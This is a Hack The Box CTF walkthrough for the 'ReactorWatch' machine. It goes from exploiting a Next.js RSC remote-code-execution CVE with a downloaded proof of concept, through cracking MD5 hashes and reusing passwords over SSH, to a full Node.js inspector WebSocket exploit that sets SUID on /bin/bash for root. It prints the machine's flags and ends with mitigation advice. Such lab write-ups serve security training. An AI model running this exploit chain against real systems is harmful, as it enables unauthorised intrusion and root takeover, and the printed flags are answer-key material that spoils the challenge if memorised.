# ReactorWatch — HTB CTF Walkthrough

**Difficulty:** Medium  
**OS:** Linux (Ubuntu 24.04)  
**User Flag:** `6d8c01f04717e63c332dfcbfff2efc41`  
**Root Flag:** `6ea25674bbe25e4fe243ebefa9b90b77`

---

## 1. Reconnaissance

### 1.1 Nmap Scan

```bash
nmap -sC -sV 10.129.162.159
```

**Open Ports:**

| Port | Service | Detail |
|------|---------|--------|
| 22/tcp | SSH | OpenSSH 9.6p1 Ubuntu |
| 3000/tcp | HTTP | Next.js web application |

The `X-Powered-By: Next.js` response header is visible directly in the Nmap output, confirming the web stack without needing to visit the site.

### 1.2 Web Enumeration

Visiting `http://10.129.162.159:3000/` reveals a static dashboard titled **"ReactorWatch Core Monitoring System"** — no login forms or visible input fields.

Checking technology stack via **Wappalyzer** or response headers:

- **Next.js 15.0.3**
- **React 19.0.0-rc**

---

## 2. Identifying the Vulnerability

The combination of **Next.js 15.0.3** and **React 19.0.0-rc** is vulnerable to **CVE-2025-55182**, also known as **React2Shell**.

This is a critical **unauthenticated Remote Code Execution** vulnerability in the React Server Components (RSC) Flight protocol. A specially crafted request can cause the server to deserialize attacker-controlled data, leading to arbitrary command execution.

---

## 3. Initial Foothold — CVE-2025-55182

### 3.1 Download the Exploit

The target machine may have DNS issues. If `raw.githubusercontent.com` is unresolvable, add a static entry:

```bash
echo "185.199.108.133 raw.githubusercontent.com" | sudo tee -a /etc/hosts
```

Then download the public PoC:

```bash
curl -L -o CVE-2025-55182.py \
  https://raw.githubusercontent.com/Least-Significant-Bit/CVE-2025-55182/main/CVE-2025-55182.py
```

### 3.2 Set Up Python Environment

```bash
python3 -m venv exploit_env
source exploit_env/bin/activate
pip install requests
```

### 3.3 Run the Exploit

```bash
python3 CVE-2025-55182.py http://10.129.162.159:3000
```

This drops a shell as the `node` user inside `/opt/reactor-app`.

---

## 4. Post-Exploitation — Credential Discovery

### 4.1 SQLite Database

```bash
sqlite3 /opt/reactor-app/reactor.db ".tables"
# sensor_logs  users

sqlite3 /opt/reactor-app/reactor.db "SELECT * FROM users;"
```

**Output:**
```
1|admin|a203b22191d744a4e70ada5c101b17b8|administrator|admin@reactor.htb
2|engineer|39d97110eafe2a9a68639812cd271e8e|operator|engineer@reactor.htb
```

These are 32-character **MD5 hashes**.

### 4.2 Hash Cracking

Save both hashes and crack with John:

```bash
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

The `admin` hash cracks to **`reactor1`**. The `engineer` hash does not crack with rockyou.

### 4.3 Password Reuse → SSH Access

Despite the `engineer` hash not cracking, attempt the `admin` password for the `engineer` account (password reuse is common in CTFs):

```bash
ssh engineer@10.129.162.159
# Password: reactor1
```

**Successful login.**

### 4.4 User Flag

```bash
cat /home/engineer/user.txt
# 6d8c01f04717e63c332dfcbfff2efc41
```

---

## 5. Privilege Escalation

### 5.1 Enumeration

Standard checks first:

```bash
sudo -l          # Not allowed
find / -perm -4000 2>/dev/null   # No interesting SUID binaries
id
# uid=1000(engineer) gid=1000(engineer) groups=1000(engineer),4(adm),24(cdrom),30(dip),46(plugdev),101(lxd)
```

Notable findings from `ps aux` and `ss -tlnp`:

```bash
ss -tlnp
# LISTEN  127.0.0.1:9229   ← Node.js inspector port
```

```
root  1382  /usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js
```

**A Node.js process is running as root with the debugger inspector enabled on localhost port 9229.** This is the privesc vector.

### 5.2 Understanding the Target

```bash
cat /opt/uptime-monitor/worker.js
```

The script is a simple uptime monitor that polls the Next.js app every 30 seconds and logs results to a CSV. It's a long-running root process — perfect for inspector exploitation.

### 5.3 Confirm Inspector is Accessible

```bash
curl -s http://127.0.0.1:9229/json
```

**Output:**
```json
[{
  "description": "node.js instance",
  "id": "ea445f11-e3cc-4188-80ee-f83db55a4d70",
  "title": "/opt/uptime-monitor/worker.js",
  "webSocketDebuggerUrl": "ws://127.0.0.1:9229/ea445f11-e3cc-4188-80ee-f83db55a4d70"
}]
```

The Chrome DevTools Protocol (CDP) WebSocket endpoint is live. Any code sent via `Runtime.evaluate` executes in the context of the root Node.js process.

### 5.4 Exploit the Node Inspector

The `ws` npm module is not installed, so we implement the WebSocket handshake manually using Node's built-in `net` module. The payload uses `process.mainModule.require` to access `child_process` since `require` is not directly available in the inspector evaluation context.

```bash
node -e "
const net = require('net');

const WS_PATH = '/ea445f11-e3cc-4188-80ee-f83db55a4d70';
const PAYLOAD = 'process.mainModule.require(\"child_process\").execSync(\"chmod u+s /bin/bash\").toString()';
const frame = JSON.stringify({id:1, method:'Runtime.evaluate', params:{expression: PAYLOAD}});

const handshake = [
  'GET ' + WS_PATH + ' HTTP/1.1',
  'Host: 127.0.0.1:9229',
  'Upgrade: websocket',
  'Connection: Upgrade',
  'Sec-WebSocket-Key: dGhpcyBpcyBhIHRlc3Q=',
  'Sec-WebSocket-Version: 13',
  '',''
].join('\r\n');

const sock = net.connect(9229, '127.0.0.1', () => sock.write(handshake));

sock.once('data', () => {
  const msg = Buffer.from(frame);
  const mask = Buffer.from([0xAB, 0xCD, 0xEF, 0x12]);
  const len = msg.length;
  let header;
  if (len < 126) {
    header = Buffer.alloc(6 + len);
    header[0] = 0x81; header[1] = 0x80 | len;
    mask.copy(header, 2);
    for (let i = 0; i < len; i++) header[6+i] = msg[i] ^ mask[i%4];
  } else {
    header = Buffer.alloc(8 + len);
    header[0] = 0x81; header[1] = 0xFE;
    header.writeUInt16BE(len, 2);
    mask.copy(header, 4);
    for (let i = 0; i < len; i++) header[8+i] = msg[i] ^ mask[i%4];
  }
  sock.write(header);
  setTimeout(() => sock.destroy(), 3000);
});

sock.on('data', (d) => console.log('Response:', d.toString()));
sock.on('close', () => console.log('done'));
"
```

**Key points about the WebSocket frame construction:**
- Payloads under 126 bytes use a 1-byte length field
- Payloads 126–65535 bytes use opcode `0xFE` with a 2-byte extended length
- All client→server frames must be masked with a 4-byte XOR key per the WebSocket spec

### 5.5 Verify SUID and Get Root Shell

```bash
ls -la /bin/bash
# -rwsr-xr-x 1 root root 1446024 Mar 31  2024 /bin/bash
```

The `s` in the permissions confirms the SUID bit is set. Now escalate:

```bash
bash -p
whoami
# root
```

### 5.6 Root Flag

```bash
cat /root/root.txt
# 6ea25674bbe25e4fe243ebefa9b90b77
```

---

## 6. Attack Chain Summary

```
Nmap → Next.js 15.0.3 on :3000
         ↓
CVE-2025-55182 (RSC RCE) → shell as node user
         ↓
SQLite reactor.db → MD5 hash → cracked: reactor1
         ↓
Password reuse → SSH as engineer
         ↓
ps aux → root Node.js process with --inspect=127.0.0.1:9229
         ↓
CDP WebSocket RCE → chmod u+s /bin/bash
         ↓
bash -p → root shell
```

---

## 7. Key Takeaways

**CVE-2025-55182** demonstrates that React Server Components can be abused to achieve unauthenticated RCE when the RSC flight protocol does not properly validate or sandbox deserialized payloads.

**Node.js `--inspect` in production** is a critical misconfiguration. The inspector opens a CDP WebSocket that accepts arbitrary JavaScript execution with no authentication — when the process runs as root, it is equivalent to an unauthenticated root shell waiting to be triggered by any local user.

**Password reuse** between the `admin` and `engineer` accounts was the bridge from the compromised app context to a real SSH session.

**Mitigation recommendations:**
- Never run Node.js with `--inspect` or `--inspect-brk` in production
- Run application services as unprivileged dedicated users, never root
- Use unique, strong passwords per account — never reuse credentials
- Keep Next.js and React dependencies up to date and patched
